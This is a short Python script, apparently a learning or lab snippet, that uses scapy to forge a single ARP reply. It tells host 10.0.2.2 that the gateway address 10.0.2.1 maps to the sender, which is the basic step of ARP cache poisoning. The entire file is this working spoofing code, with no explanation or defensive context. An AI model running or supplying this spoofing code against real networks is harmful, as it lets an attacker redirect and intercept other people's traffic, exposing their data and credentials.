import scapy.all as scapy

packet=scapy.ARP(op=2,pdst="10.0.2.2",hwdst="28:f1:0e:2f:76:d3",psrc="10.0.2.1")
scapy.send(packet)
